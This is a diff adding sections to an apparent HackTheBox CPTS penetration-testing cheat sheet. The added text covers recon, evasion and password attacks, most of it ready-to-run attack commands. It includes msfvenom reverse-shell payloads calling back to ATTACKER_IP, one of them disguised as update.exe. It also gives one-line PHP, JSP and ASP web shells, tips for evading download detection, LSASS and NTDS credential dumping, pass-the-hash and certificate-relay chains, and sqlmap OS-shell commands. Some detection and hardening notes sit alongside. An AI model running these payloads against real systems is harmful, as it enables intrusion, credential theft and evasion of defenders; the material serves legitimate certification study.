@@ -22,6 +22,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
 - [Conventions](#conventions)
 - [1. Tmux](#1-tmux)
 - [2. Nmap](#2-nmap)
+  - [Enumeration Methodology](#enumeration-methodology)
   - [Address Scanning](#address-scanning)
   - [Scan Techniques](#scan-techniques)
   - [Host Discovery](#host-discovery)
@@ -33,6 +34,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Output](#output)
 - [3. Service Footprinting](#3-service-footprinting)
   - [Infrastructure & OSINT Enumeration](#infrastructure--osint-enumeration)
+  - [Domain, Cloud & Staff Enumeration](#domain-cloud--staff-enumeration)
   - [FTP (21/tcp)](#ftp-21tcp)
   - [MSRPC (135/tcp)](#msrpc-135tcp)
   - [SMB (139, 445/tcp)](#smb-139-445tcp)
@@ -57,6 +59,7 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Nikto](#nikto)
   - [ReconSpider](#reconspider)
   - [Automated Reconnaissance](#automated-reconnaissance)
+  - [Crawling, robots.txt, .well-known & Archives](#crawling-robotstxt-well-known--archives)
 - [5. File Transfers](#5-file-transfers)
   - [Windows](#windows)
     - [Download Operations](#download-operations)
@@ -107,11 +110,13 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
     - [WinHttpRequest (COM)](#winhttprequest-com)
     - [Msxml2 (COM)](#msxml2-com)
     - [BITS (COM)](#bits-com)
+  - [Detection & Evasion](#detection--evasion)
 - [6. Shells](#6-shells)
   - [Reverse Shell](#reverse-shell)
   - [Bind Shell](#bind-shell)
   - [Web Shell](#web-shell)
   - [TTY Upgrade](#tty-upgrade)
+  - [Payloads, MSFvenom & Web Shells](#payloads-msfvenom--web-shells)
 - [7. Password Attacks](#7-password-attacks)
   - [Password Mutations](#password-mutations)
   - [Remote Password Attacks](#remote-password-attacks)
@@ -119,6 +124,10 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Linux Credential Hunting](#linux-credential-hunting)
   - [Cracking Passwords](#cracking-passwords)
   - [Login Brute Forcing (Hydra)](#login-brute-forcing-hydra)
+  - [Hashing, John & Hashcat](#hashing-john--hashcat)
+  - [Credential Access & Lateral Movement](#credential-access--lateral-movement)
+  - [Medusa & Custom Wordlists](#medusa--custom-wordlists)
+  - [Attack Types, Policy & Defense](#attack-types-policy--defense)
 - [8. Pivoting, Tunneling & Port Forwarding](#8-pivoting-tunneling--port-forwarding)
   - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
   - [SSH Dynamic Port Forwarding (SOCKS)](#ssh-dynamic-port-forwarding-socks)
@@ -134,7 +143,9 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
     - [Reverse SOCKS Proxy (Pivot as Server)](#reverse-socks-proxy-pivot-as-server)
     - [Chisel Reverse Pivot (Attack Host as Server)](#chisel-reverse-pivot-attack-host-as-server)
   - [ICMP Tunneling (ptunnel-ng)](#icmp-tunneling-ptunnel-ng)
+  - [Windows & Additional Pivoting](#windows--additional-pivoting)
 - [9. Attacking Common Services](#9-attacking-common-services)
+  - [Service Misconfigurations & Sensitive Information](#service-misconfigurations--sensitive-information)
   - [FTP](#ftp)
   - [SMB](#smb)
   - [SQL (MySQL & MSSQL)](#sql-mysql--mssql)
@@ -172,7 +183,9 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Cross-Forest Trusts](#cross-forest-trusts)
     - [From Windows](#from-windows-1)
     - [From Linux](#from-linux-1)
+  - [AD Tooling, External Recon & Advanced Attacks](#ad-tooling-external-recon--advanced-attacks)
 - [11. SQLMap](#11-sqlmap)
+  - [Advanced SQLMap Options](#advanced-sqlmap-options)
 - [12. Attacking Common Web Applications](#12-attacking-common-web-applications)
   - [Application Enumeration](#application-enumeration)
   - [WordPress](#wordpress)
@@ -187,6 +200,11 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [IIS Tilde Enumeration](#iis-tilde-enumeration)
   - [LDAP](#ldap)
   - [Jenkins](#jenkins)
+  - [osTicket, Thick Clients, Mass Assignment & Hardening](#osticket-thick-clients-mass-assignment--hardening)
+    - [osTicket](#osticket)
+    - [Thick Client Applications](#thick-client-applications)
+    - [Web Mass Assignment](#web-mass-assignment)
+    - [Application Hardening](#application-hardening)
 - [13. Linux Privilege Escalation](#13-linux-privilege-escalation)
   - [Quick Checks](#quick-checks)
   - [Information Gathering](#information-gathering)
@@ -393,6 +411,24 @@ prefix + [Shift + O]
 
 ## 2. Nmap
 
+### Enumeration Methodology
+
+Enumeration is iterative. Start with a fast scan, expand to all TCP ports, add UDP where relevant, then fingerprint each service and follow anomalies.
+
+```bash
+# Fast pass, then all ports
+nmap -sC -sV -oA initial <TARGET_IP>
+nmap -p- -sV -oA all_tcp <TARGET_IP>
+
+# UDP top ports
+sudo nmap -sU --top-ports 100 -oA udp <TARGET_IP>
+
+# Scripts and version intensity
+nmap -sC -sV --version-all -p <PORTS> <TARGET_IP>
+```
+
+Document each service, version, and banner; re-scan after changes. Correlate results with hostnames, virtual hosts, and certificates before moving to exploitation.
+
 ### Address Scanning
 
 ```
@@ -545,6 +581,46 @@ curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .
 # Scan each IP address in a list using Shodan.
 for i in $(cat ip-addresses.txt);do shodan host $i;done
 ```
+
+### Domain, Cloud & Staff Enumeration
+
+Use an iterative methodology: identify the layer you are in (internet, DMZ, internal, restricted), enumerate broadly, then dig into anomalies.
+
+```bash
+# Domain and certificate transparency
+whois <DOMAIN>
+dig any <DOMAIN>
+curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq .
+curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name |
+  cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 |
+  awk '{gsub(/\\n/,"\n");}1;' | sort -u
+
+# Resolve discovered subdomains and collect IPs
+for i in $(cat subdomains.txt); do host "$i" | grep "has address"; done
+for i in $(cat subdomains.txt); do host "$i" | grep "has address" | awk '{print $4}'; done |
+  sort -u > ip-addresses.txt
+
+# Enrich with Shodan
+for i in $(cat ip-addresses.txt); do shodan host "$i"; done
+```
+
+Cloud resource checks:
+
+```bash
+# AWS S3 / GCP Storage / Azure Blob naming patterns
+aws s3 ls s3://<BUCKET> --no-sign-request
+gsutil ls gs://<BUCKET>
+curl -s https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list
+```
+
+Look for public storage buckets, exposed CI/CD artifacts, and cloud-hosted subdomains. Use search engines for `site:s3.amazonaws.com <COMPANY>`, `site:blob.core.windows.net <COMPANY>`, and `site:storage.googleapis.com <COMPANY>`.
+
+Staff and OSINT:
+
+- Company website, LinkedIn, job postings, GitHub/GitLab, social media.
+- Email format discovery (`first.last@`, `flast@`, etc.).
+- `theHarvester`, `hunter.io`, breach data, and public paste sites.
+- Usernames and email addresses feed password spraying and phishing simulations.
 
 ### FTP (21/tcp)
 
@@ -829,6 +905,61 @@ python3 ReconSpider.py http://inlanefreight.com
 ```
 you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
 ```
+
+### Crawling, robots.txt, .well-known & Archives
+
+```bash
+# robots.txt and sitemap
+curl -s http://<TARGET>/robots.txt
+curl -s http://<TARGET>/sitemap.xml
+
+# Common .well-known URIs
+for p in security.txt change-password openid-configuration \
+         assetlinks.json apple-app-site-association; do
+  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
+    "http://<TARGET>/.well-known/$p"
+done
+```
+
+Crawling and JavaScript discovery:
+
+```bash
+gospider -s http://<TARGET> -d 2 -c 10
+hakrawler -url http://<TARGET> -depth 2
+katana -u http://<TARGET> -d 3 -jc
+feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+Inspect JavaScript bundles for API routes, secrets, and hidden endpoints:
+
+```bash
+curl -s http://<TARGET>/ | grep -oE 'src="[^"]+\.js' | cut -d'"' -f2
+python3 LinkFinder.py -i http://<TARGET> -d
+```
+
+Search engine discovery:
+
+```text
+site:<DOMAIN>
+site:<DOMAIN> filetype:pdf
+site:<DOMAIN> inurl:admin
+site:<DOMAIN> intitle:"index of"
+inurl:<DOMAIN> ext:php
+```
+
+```bash
+theHarvester -d <DOMAIN> -b all -l 500
+```
+
+Web archives:
+
+```bash
+waybackurls <DOMAIN> | tee wayback.txt
+gau <DOMAIN> | tee gau.txt
+cat wayback.txt gau.txt | sort -u | grep -E '\.(js|php|asp|aspx|jsp|json|xml|bak|old|zip)$'
+```
+
+Also query the Wayback Machine manually and use `waybackpack` for older versions of a specific URL.
 
 ## 5. File Transfers
 
@@ -1321,6 +1452,31 @@ rm $env:temp\t
 iex $r
 ```
 
+### Detection & Evasion
+
+Download methods leave distinct artifacts. Common detection signals:
+
+- PowerShell `Invoke-WebRequest`/`Invoke-RestMethod` user-agent.
+- `certutil` user-agent (`Microsoft-CryptoAPI`).
+- BITS transfers (`Microsoft BITS` user-agent and `Start-BitsTransfer` events).
+- WinHttpRequest/Msxml2 COM requests from Office or script hosts.
+- Large outbound transfers, uncommon destinations, and executable downloads.
+- Sysmon Event IDs 1 (process), 3 (network), 11 (file create), 22 (DNS).
+
+Evasion basics:
+
+```powershell
+# Change the PowerShell download user-agent
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<ATTACKER>/file -UserAgent $UserAgent -OutFile file
+```
+
+- Prefer HTTPS and legitimate cloud services (GitHub, OneDrive, S3) over raw HTTP.
+- Use built-in/LOLBins (`certutil`, `bitsadmin`, `GfxDownloadWrapper`) where appropriate.
+- Encode or chunk payloads; avoid obvious strings.
+- Test detection in the lab before relying on a method in production.
+- Egress filtering, proxy logging, and EDR rule tuning are the defensive counterparts.
+
 ## 6. Shells
 
 ### Reverse Shell
@@ -1385,6 +1541,70 @@ Vim escape:
 :set shell=/bin/sh
 :shell
 ```
+
+### Payloads, MSFvenom & Web Shells
+
+Payload types:
+
+- **Single** — self-contained (e.g., `windows/shell_reverse_tcp`).
+- **Stager + stage** — small stager downloads the main payload (e.g., `windows/meterpreter/reverse_tcp`).
+- **Bind vs reverse** — bind listens on the target; reverse connects back to the attack host.
+- **Inline vs staged** — inline embeds the payload; staged fetches it.
+
+MSFvenom examples:
+
+```bash
+msfvenom -l payloads
+
+# Linux ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f elf > shell.elf
+
+# Windows EXE
+msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe > update.exe
+
+# PHP / ASPX / WAR
+msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=443 -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f aspx > shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f war > shell.war
+```
+
+Listener:
+
+```text
+msf6 > use multi/handler
+msf6 > set payload windows/shell_reverse_tcp
+msf6 > set LHOST <ATTACKER_IP>
+msf6 > set LPORT 443
+msf6 > run
+```
+
+Web shells:
+
+```bash
+# Laudanum (ASPX example)
+cp /usr/share/laudanum/aspx/shell.aspx ./demo.aspx
+
+# Antak (Nishang)
+cp /usr/share/nishang/Antak-WebShell/antak.aspx ./Upload.aspx
+```
+
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+```asp
+<% eval request("cmd") %>
+```
+
+Detection and prevention:
+
+- AV/EDR signatures, AMSI, and script-block logging.
+- Web shells in upload directories, unusual child processes of web servers, and outbound connections from web services.
+- Disable dangerous functions, restrict upload directories, and monitor file integrity.
 
 ## 7. Password Attacks
 
@@ -1492,6 +1712,198 @@ hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
 # Login Form Brute Force - Static User, Pass Wordlist
 hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
+
+### Hashing, John & Hashcat
+
+Identify hashes before cracking:
+
+```bash
+hashid -j <HASH>
+hashid -m '$1$...'
+```
+
+John:
+
+```bash
+john --single passwd
+john --wordlist=<WORDLIST> <HASH_FILE>
+john --incremental <HASH_FILE>
+john <HASH_FILE> --show
+```
+
+Hashcat:
+
+```bash
+hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 0 <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -a 3 -m 0 <HASH> '?u?l?l?l?l?d?s'
+hashcat --help
+```
+
+Protected files and archives:
+
+```bash
+locate '*2john*'
+
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+
+office2john.py Protected.docx > protected-docx.hash
+john --wordlist=rockyou.txt protected-docx.hash
+
+pdf2john.py PDF.pdf > pdf.hash
+john --wordlist=rockyou.txt pdf.hash
+
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+
+bitlocker2john -i Backup.vhd > backup.hashes
+```
+
+Use `hashcat --example-hashes` or `hashid` to map the format to the correct mode.
+
+### Credential Access & Lateral Movement
+
+Windows credential sources:
+
+```cmd
+# SAM / SYSTEM / SECURITY
+reg save HKLM\SAM SAM.SAV
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SECURITY SECURITY.SAV
+
+# LSASS
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+# Credential Manager
+cmdkey /list
+runas /savecred /user:<DOMAIN>\<USER> cmd
+
+# NTDS.dit (on a DC or from a backup)
+ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
+```
+
+```bash
+secretsdump.py -sam SAM.SAV -system SYSTEM.SAV -security SECURITY.SAV LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
+```
+
+Network credential hunting:
+
+```bash
+# Capture traffic and parse cleartext credentials
+sudo tcpdump -i <IFACE> -s 65535 -w capture.pcap
+./Pcredz -f capture.pcap -t -v
+
+# SMB share hunting
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "passw"
+```
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
+```
+
+Pass-the-Hash (PtH):
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+```
+
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami" -Verbose
+Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami"
+```
+
+```bash
+impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
+evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
+xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH>
+```
+
+Pass-the-Ticket (PtT):
+
+```text
+# Windows — Rubeus
+Rubeus.exe triage
+Rubeus.exe dump /luid:<LUID> /service:krbtgt
+Rubeus.exe ptt /ticket:<BASE64_TICKET>
+klist
+```
+
+```bash
+# Linux — keytab / ccache
+klist -k -t <USER>.keytab
+kinit <USER>@<DOMAIN> -k -t <USER>.keytab
+klist
+export KRB5CCNAME=/path/to/krb5cc_<UID>
+smbclient //<DC>/<SHARE> -k -c ls
+impacket-ticketConverter krb5cc_<UID> <USER>.kirbi
+```
+
+Pass-the-Certificate:
+
+```bash
+impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs -smb2support \
+  --template KerberosAuthentication
+python3 printerbug.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET> <ATTACKER_IP>
+
+git clone https://github.com/dirkjanm/PKINITtools.git
+python3 gettgtpkinit.py -cert-pfx <CERT>.pfx -dc-ip <DC_IP> '<DOMAIN>/<USER>' /tmp/<USER>.ccache
+export KRB5CCNAME=/tmp/<USER>.ccache
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator \
+  '<DOMAIN>/<USER>'@<DC_FQDN>
+```
+
+Certificate services are high-impact: request a certificate for a privileged account, use PKINIT to get a TGT, then DCSync.
+
+### Medusa & Custom Wordlists
+
+Medusa:
+
+```bash
+medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ssh
+medusa -h <TARGET> -U usernames.txt -P passwords.txt -M ftp -t 5
+medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
+medusa -h <TARGET> -U usernames.txt -e ns -M <SERVICE>
+```
+
+Custom wordlists:
+
+```bash
+# Username variants from a name
+./username-anarchy Jane Smith > jane_usernames.txt
+
+# Interactive custom password list
+cupp -i
+
+# Website keywords
+cewl https://<TARGET> -d 4 -m 6 --lowercase -w site.wordlist
+
+# Rules / mutations
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+```
+
+Filter generated passwords to match the policy, and respect lockout thresholds. Prefer spraying one password across many users over brute-forcing one account.
+
+### Attack Types, Policy & Defense
+
+- **Brute force** — try every value in a keyspace (short PINs, small OTP spaces).
+- **Dictionary** — try a wordlist of likely passwords.
+- **Hybrid** — wordlist plus mutations/rules (case, numbers, symbols).
+- **Password spraying** — one or a few passwords across many users; avoids lockout.
+- **Credential stuffing** — reuse credentials from breaches; watch for MFA and lockouts.
+
+Before attacking, enumerate the policy and lockout threshold:
+
+```bash
+crackmapexec smb <DC> -u <USER> -p '<PASSWORD>' --pass-pol
+rpcclient -U "" -N <DC> -c "querydominfo"
+ldapsearch -h <DC> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+Check for MFA, CAPTCHA, rate limits, and account lockout. Prefer spraying with a single candidate and a delay. Defensively, enforce MFA, strong password policy, lockout thresholds, breached-password checks, and monitoring for distributed spraying. Password managers reduce reuse; never store cleartext credentials in world-readable files.
 
 ## 8. Pivoting, Tunneling & Port Forwarding
 
@@ -1873,7 +2285,71 @@ proxychains4 xfreerdp /v:172.16.5.19 /u:USERNAME
 
 ```
 
+### Windows & Additional Pivoting
+
+`plink.exe` (PuTTY's Windows SSH client):
+
+```cmd
+plink.exe -ssh -D 9050 <USER>@<PIVOT>
+plink.exe -ssh -R 8080:127.0.0.1:80 <USER>@<PIVOT>
+```
+
+`sshuttle` (VPN-like forwarding over SSH, no SOCKS proxy):
+
+```bash
+sudo apt-get install sshuttle
+sudo sshuttle -r <USER>@<PIVOT> <INTERNAL_SUBNET> -v
+sudo nmap -v -A -sT -p3389 <INTERNAL_IP> -Pn
+```
+
+SocksOverRDP (SOCKS over an RDP session):
+
+```cmd
+regsvr32.exe SocksOverRDP-Plugin.dll
+netstat -antb | findstr 1080
+```
+
+Then point proxychains at `127.0.0.1:1080`. Use the matching SocksOverRDP client on the attack host.
+
+Detection and prevention:
+
+- Egress filtering and allowlists for outbound SSH/RDP.
+- Proxy/DNS logs, anomalous long-lived connections, and tunnels over unusual ports.
+- Restrict SSH forwarding (`AllowTcpForwarding no`), disable unused RDP, and monitor for `plink`/`sshuttle` binaries.
+- Network segmentation and host-based firewall rules.
+
 ## 9. Attacking Common Services
+
+### Service Misconfigurations & Sensitive Information
+
+Common service misconfigurations:
+
+| Service | Checks |
+|---|---|
+| FTP | Anonymous login, writable directories, version CVEs |
+| SMB | Null sessions, guest access, share permissions, signing |
+| SQL | Default/weak `sa`, `xp_cmdshell`, linked servers |
+| RDP | NLA, weak credentials, BlueKeep-style CVEs |
+| DNS | Zone transfers, recursion, cache poisoning |
+| SMTP | Open relay, user enumeration (VRFY/RCPT) |
+| SNMP | Default community strings, readable OIDs |
+| NFS | `no_root_squash`, world-readable exports |
+
+Finding sensitive information:
+
+```bash
+# Service banners and versions
+nmap -sV -sC -p- <TARGET>
+
+# Web/config/backup files
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
+  -u http://<TARGET>/FUZZ -e .bak,.old,.zip,.config,.env
+
+# Anonymous shares
+smbclient -N -L //<TARGET>
+```
+
+Check discovered versions against CVEs (`searchsploit <product> <version>`, NVD, vendor advisories) and validate the exploit before running it. Default credentials and anonymous access are common findings; document them with evidence.
 
 ### FTP
 
@@ -2737,6 +3213,61 @@ nameserver 172.16.5.238
 bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p '<PASSWORD>'
 ```
 
+### AD Tooling, External Recon & Advanced Attacks
+
+Tooling:
+
+- **BloodHound/SharpHound** — graph relationships, ACLs, sessions.
+- **PowerView** — domain enumeration and ACL abuse.
+- **Rubeus** — Kerberos tickets, Kerberoasting, AS-REP, PtT.
+- **Impacket** — `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`, `wmiexec.py`, `ticketer.py`.
+- **Windapsearch / ldapsearch** — LDAP enumeration.
+- **Snaffler** — find credentials and sensitive files on shares.
+- **AD Explorer / ADSI Edit** — GUI inspection.
+
+External recon:
+
+```bash
+dig any <DOMAIN>
+dig axfr <DOMAIN> @<NAMESERVER>
+nmap -sV -sC -p 53,80,443,389,636,88,445,3389 <TARGET>
+ldapsearch -H ldap://<TARGET> -x -s base -b "" namingContexts
+```
+
+Look for exposed VPN, OWA, AD FS, and LDAP services. Enumerate usernames via DNS, email formats, and public data before spraying.
+
+Privileged access and the Kerberos double-hop problem:
+
+```powershell
+Enter-PSSession -ComputerName <HOST> -Credential $cred
+Invoke-Command -ComputerName <HOST> -Credential $cred -ScriptBlock { whoami }
+klist
+```
+
+- The double-hop problem occurs when a second network hop cannot reuse the user's credentials.
+- Options: CredSSP, constrained delegation, `PSSessionConfiguration`, or Kerberos delegation.
+- Check unconstrained delegation and `TrustedForDelegation` accounts.
+
+Bleeding-edge vulnerabilities to check:
+
+- **Zerologon** (CVE-2020-1472) — Netlogon cryptographic bypass.
+- **PrintNightmare** (CVE-2021-1675 / CVE-2021-34527) — print spooler RCE/LPE.
+- **PetitPotam** — coercion to relay NTLM to AD CS or SMB.
+- **noPac** (CVE-2021-42278 / CVE-2021-42287) — sAMAccountName spoofing to Domain Admin.
+- **AD CS ESC1-ESC8** — certificate template abuse.
+
+Check patch levels and only run a PoC that matches the target. These attacks can be disruptive.
+
+AD hardening and auditing:
+
+- Tiered administration; separate DA, server, and workstation admins.
+- LAPS for local admin passwords; disable inactive accounts.
+- Disable LLMNR/NBT-NS and mDNS where possible.
+- Restrict Kerberos delegation and unconstrained delegation.
+- Enforce LDAP signing/channel binding; protect AD CS templates.
+- Patch DCs and monitor replication, DCSync, and privilege changes.
+- Audit ACLs, SPNs, password policy, and privileged group membership.
+
 ## 11. SQLMap
 
 ```
@@ -2779,6 +3310,46 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
+
+### Advanced SQLMap Options
+
+```bash
+# Detection and tuning
+sqlmap -u "http://<TARGET>/?id=1" --level=5 --risk=3
+sqlmap -u "http://<TARGET>/?id=1" --technique=BEUSTQ
+sqlmap -u "http://<TARGET>/?id=1" --dbms=mysql
+sqlmap -u "http://<TARGET>/?id=1" --batch --threads=10
+
+# Request options
+sqlmap -r request.txt
+sqlmap -u "http://<TARGET>/?id=1" --cookie="<COOKIE_NAME>=<COOKIE_VALUE>"
+sqlmap -u "http://<TARGET>/?id=1" --headers="X-Forwarded-For: 127.0.0.1"
+sqlmap -u "http://<TARGET>/?id=1" --random-agent
+sqlmap -u "http://<TARGET>/?id=1" --proxy=http://127.0.0.1:8080
+
+# Enumeration
+sqlmap -u "http://<TARGET>/?id=1" --dbs
+sqlmap -u "http://<TARGET>/?id=1" -D <DB> --tables
+sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --columns
+sqlmap -u "http://<TARGET>/?id=1" -D <DB> -T <TABLE> --dump
+sqlmap -u "http://<TARGET>/?id=1" --dump-all
+sqlmap -u "http://<TARGET>/?id=1" --search -T user
+sqlmap -u "http://<TARGET>/?id=1" --passwords --privileges --roles
+
+# WAF/CSRF bypass
+sqlmap -u "http://<TARGET>/?id=1" --tamper=<TAMPER_SCRIPT>
+sqlmap -u "http://<TARGET>/?id=1" --randomize=<PARAM>
+sqlmap -u "http://<TARGET>/?id=1" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
+
+# OS/file access (requires DBA privileges)
+sqlmap -u "http://<TARGET>/?id=1" --is-dba
+sqlmap -u "http://<TARGET>/?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://<TARGET>/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+sqlmap -u "http://<TARGET>/?id=1" --os-shell
+sqlmap -u "http://<TARGET>/?id=1" --os-pwn
+```
+
+Use `--batch` for automation, `-v 3` for payload visibility, and `--flush-session` after changing the target or options.
 
 ## 12. Attacking Common Web Applications
 
@@ -3089,6 +3660,64 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > bac
 	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 
 ```
+
+### osTicket, Thick Clients, Mass Assignment & Hardening
+
+#### osTicket
+
+- Discover the help desk at `/osticket/`, `/support/`, or a dedicated vhost.
+- Enumerate version, tickets, and exposed configuration.
+- Check for default/weak admin credentials and known CVEs.
+- Sensitive files: `include/ost-config.php`, database backups, email configuration.
+
+```bash
+curl -s http://<TARGET>/osticket/
+curl -s http://<TARGET>/osticket/include/ost-config.php
+searchsploit osticket
+```
+
+#### Thick Client Applications
+
+- Inspect with Procmon, Process Explorer, and Strings.
+- Decompile .NET/JAR clients with dnSpy, ILSpy, or JD-GUI.
+- Proxy traffic with Burp/ZAP/Fiddler; check for hardcoded credentials and API keys.
+- Test insecure update mechanisms, local file storage, and client-side authorization.
+
+```cmd
+strings64.exe .\client.exe
+dir C:\Users\<USER>\AppData\Local\Temp
+```
+
+```bash
+jar -xf client.jar
+grep -R "password\|api_key\|secret" .
+```
+
+#### Web Mass Assignment
+
+Add privileged fields to JSON/form bodies and observe whether the server accepts them:
+
+```json
+{
+  "username": "user",
+  "password": "<PASSWORD>",
+  "email": "user@example.com",
+  "is_admin": true,
+  "role": "admin",
+  "verified": true
+}
+```
+
+Test registration, profile update, password reset, and API endpoints. Use Burp Repeater/Intruder to add fields one at a time.
+
+#### Application Hardening
+
+- Patch applications and remove default/example apps.
+- Restrict admin interfaces by network or SSO.
+- Enforce least privilege for service accounts and database users.
+- Validate and allowlist mass-assignment fields.
+- Disable directory listing and unnecessary HTTP methods.
+- Monitor application logs and upload directories.
 
 ## 13. Linux Privilege Escalation
 
